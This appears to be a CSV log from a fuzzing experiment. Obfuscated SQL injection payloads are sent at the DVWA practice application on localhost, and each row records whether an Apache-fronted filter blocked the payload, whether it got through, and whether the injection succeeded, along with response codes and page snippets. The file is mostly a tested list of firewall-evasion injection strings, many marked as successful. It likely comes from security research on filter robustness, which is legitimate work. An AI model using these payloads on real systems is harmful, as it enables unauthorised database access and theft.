Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@!=1+or%0bnot+{x%0b(select%0b1)}=1%0bis%0bfalse--+,Bypassed,No,None,Invalid,0.0603,74.09,No,500,
0%27<@!=1+||+!~false=+(not+{x+(select+1)}=1)+||',Blocked,No,None,Invalid,0.0386,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0b||%0bnot%0b{`if`+1}=1=%0b(not+{a+1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.047,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0b1+like+{`if`+1}=1+||%27,Bypassed,No,None,Invalid,0.035,74.09,No,500,
0%27||%0b1<@.%0b||+!%0b{`if`+1}=1=+(not%0b{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.025,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0bnot+{`if`+1}=1=%0b(not+1)%0b||%27,Bypassed,No,None,Invalid,0.0476,74.09,No,500,
0%27<@=.1%0b||+not%0b{a+1}=1=+(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.047,74.09,No,500,
0'<@!=1+or%0b!+{x%0b(select+1)}=1=%0b(not~0)%0b||%27,Bypassed,No,None,Invalid,0.0277,74.09,No,500,
0'<@!=1+||+!+true=+(!+1)%0bor%27,Blocked,No,None,Invalid,0.0168,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or+!+{x+(select+1)}=1=%0b(!+{x%0b(select%0b1)}=1)--+,Blocked,No,None,Invalid,0.0358,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'||+!@<@.%0b||+not+{x%0b(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1)+||,Bypassed,No,None,Invalid,0.0222,74.09,No,500,
0'<@=1.%0b||+!~0=+(!+{x%0b(select+1)}=1)--%0b,Bypassed,No,None,Invalid,0.0228,74.09,No,500,
0'<@!=.1+or+!%0b{x+(select+1)}=1=+(!+{`if`%0b1}=1)--+,Bypassed,No,None,Invalid,0.0445,74.09,No,500,
0'<@!=1%0bor+!%0btrue=%0b(!+{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,Invalid,0.0106,74.09,No,500,
0%27<@!=1.+or+not%0b{a+1}=1=+(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0225,74.09,No,500,
0'<@!=.1+or%0b{x%0b(select%0b1)}=1%0blike+{x+(select%0b1)}=1%0bor',Bypassed,No,None,Invalid,0.0155,74.09,No,500,
0%27<@=1.+||+!%0b{a+1}=1=%0b(!~0)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0429,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+!+{a+1}=1=%0b(not%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Invalid,0.0337,74.09,No,500,
0%27<@=.1%0bor%0bnot%7efalse=%0b(!+{`if`%0b1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0273,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+!%0b1=+(!%0b{x%0b(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0195,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+false=%0b(not+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0171,74.09,No,500,
0'<@=.1+||+!+{x%0b(select%0b1)}=1=%0b(not%0b{a+1}=1)+or%27,Bypassed,No,None,Invalid,0.0274,74.09,No,500,
0%27<@=1%0b||%0b!%0b{x+(select+1)}=1=%0b(!%0b{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0328,74.09,No,500,
0'<@=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(!+{x+(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0356,74.09,No,500,
0%27<@!=.1%0bor+!%0b{a+1}=1=%0b(!+{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0398,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+!+1=+(not%0b{`if`%0b1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0285,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0b!~false=%0b(not%0btrue)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0252,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||%0b!%0b{a%0b1}=1=%0b(not+{`if`%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0824,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+not+{x+(select%0b1)}=1=%0b(!%0b{x%0b(select%0b1)}=1)+or',Blocked,No,None,Invalid,0.0145,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor%0bnot+{a%0b1}=1=%0b(!%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0209,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+{x+(select+1)}=1+like+{`if`%0b1}=1+or',Bypassed,No,None,Invalid,0.039,74.09,No,500,
0'<@!=.1+||%0b!%0b{x%0b(select+1)}=1=%0b(false)--+,Blocked,No,None,Invalid,0.0382,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+!+{`if`%0b1}=1=+(false)+||%27,Bypassed,No,None,Invalid,0.0403,74.09,No,500,
0'<@=1+or%0b!+1=+(!%0b{`if`+1}=1)%0bor',Bypassed,No,None,Invalid,0.0375,74.09,No,500,
0%27<@=1.%0b||%0bnot%0btrue=+(!+true)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0234,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||%0bnot%0b{x%0b(select+1)}=1=+(not+{a%0b1}=1)+||%27,Bypassed,No,None,Invalid,0.0161,74.09,No,500,
0%27<@!=.1%0bor%0bnot%0b{x+(select%0b1)}=1=%0b(!+{`if`+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0528,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+{x%0b(select+1)}=1+like%0b{x+(select%0b1)}=1+||',Bypassed,No,None,Invalid,0.0414,74.09,No,500,
0'<@!=.1+or+not+{x%0b(select+1)}=1=+(!%0b{`if`%0b1}=1)+or%27,Bypassed,No,None,Invalid,0.0436,74.09,No,500,
0%27<@!=1.+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+{a+1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0228,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+!+{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.0407,74.09,No,500,
0%27<@=1+or+not+{a%0b1}=1=%0b(not+{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0236,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor+!%0b{x%0b(select%0b1)}=1=+(not+{`if`%0b1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0204,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0bnot~0=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0344,74.09,No,500,
0%27or+!@<@.%0bor+not%0b1=%0b(!+true)+||',Bypassed,No,None,Invalid,0.0107,74.09,No,500,
0%27<@=1+or+not%0b{a%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0237,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||+{`if`%0b1}=1%0blike%0b{x%0b(select%0b1)}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.023,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor+not+true=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0443,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+not%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.0236,74.09,No,500,
0%27<@!=1+||+!+{x+(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1)%0bor',Blocked,No,None,Invalid,0.0146,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0bor+false=+(not%0b{a%0b1}=1)--+,Bypassed,No,None,Invalid,0.0389,74.09,No,500,
0%27<@=1.+or+not+{x+(select%0b1)}=1=%0b(!%7efalse)%0b||%27,Blocked,No,None,Invalid,0.0151,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+||%0b!+{x+(select+1)}=1=+(!%0b{`if`%0b1}=1)%23,Blocked,No,None,Invalid,0.017,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0b||%0bnot+true=%0b(not+{a+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0185,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+not%0b{x+(select+1)}=1=%0b(not%0b1)+or',Bypassed,No,None,Invalid,0.0323,74.09,No,500,
0'<@=1%0bor+not~0=+(!+{x%0b(select+1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.027,74.09,No,500,
0'<@=1.+or%0bnot~false=%0b(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.0504,74.09,No,500,
0'<@=1.+||%0bnot+{`if`+1}=1=+(!~false)--+,Bypassed,No,None,Invalid,0.0412,74.09,No,500,
0'<@!=1+or%0b!~false=+(not+true)--+,Blocked,No,None,Invalid,0.0257,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+or+not+{x%0b(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0138,74.09,No,500,
0'<@=1%0b||+!+{x+(select+1)}=1=+(!+{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.0249,74.09,No,500,
0%27<@!=1+||+!+{a+1}=1=%0b(!%0b{`if`+1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0409,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or%0b!%0b{x+(select%0b1)}=1=+(not+{x%0b(select%0b1)}=1)%0bor',Blocked,No,None,Invalid,0.0348,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||%0b!+{`if`+1}=1=%0b(!%7e0)%0bor',Bypassed,No,None,Invalid,0.0545,74.09,No,500,
0%27<@=1.+or%0bnot+{x+(select+1)}=1=%0b(not%0btrue)%23,Blocked,No,None,Invalid,0.0454,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+or%0bnot+{x+(select+1)}=1=+(!%0b{`if`+1}=1)%0bor',Blocked,No,None,Invalid,0.042,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||+not%0b{a+1}=1=+(not+{x+(select+1)}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0517,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0b!+true=+(0)+||',Bypassed,No,None,Invalid,0.0202,74.09,No,500,
0%27<@!=1+||%0b!%0b{x%0b(select+1)}=1=+(not%0b1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0667,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0b!%0b{x+(select+1)}=1=%0b(!+{x+(select%0b1)}=1)+or%27,Blocked,No,None,Invalid,0.0225,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0bor+not+{x+(select%0b1)}=1=%0b(!+{x%0b(select%0b1)}=1)%23,Bypassed,No,None,Invalid,0.0321,74.09,No,500,
0%27<@!=.1+or+not%0b{`if`+1}=1=%0b(not+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.0251,74.09,No,500,
0%27<@=1+or%0bnot%0b{x%0b(select+1)}=1=+(!+{`if`+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0187,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||+not+{x%0b(select+1)}=1=%0b(!+{a+1}=1)%0b||',Bypassed,No,None,Invalid,0.0171,74.09,No,500,
0%27<@=1.%0bor%0bnot%0b{x%0b(select%0b1)}=1=+(!+1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0326,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||%0bnot%7e0=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.0363,74.09,No,500,
0%27<@=1.%0bor+not+{a+1}=1=+(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.0295,74.09,No,500,
0'<@!=.1%0bor+not~false=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0722,74.09,No,500,
0%27<@!=.1%0bor%0bnot+{x+(select+1)}=1=+(not+{x%0b(select+1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0209,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor%0bnot+{`if`+1}=1=%0b(!%0b{`if`+1}=1)%0b||',Bypassed,No,None,Invalid,0.0366,74.09,No,500,
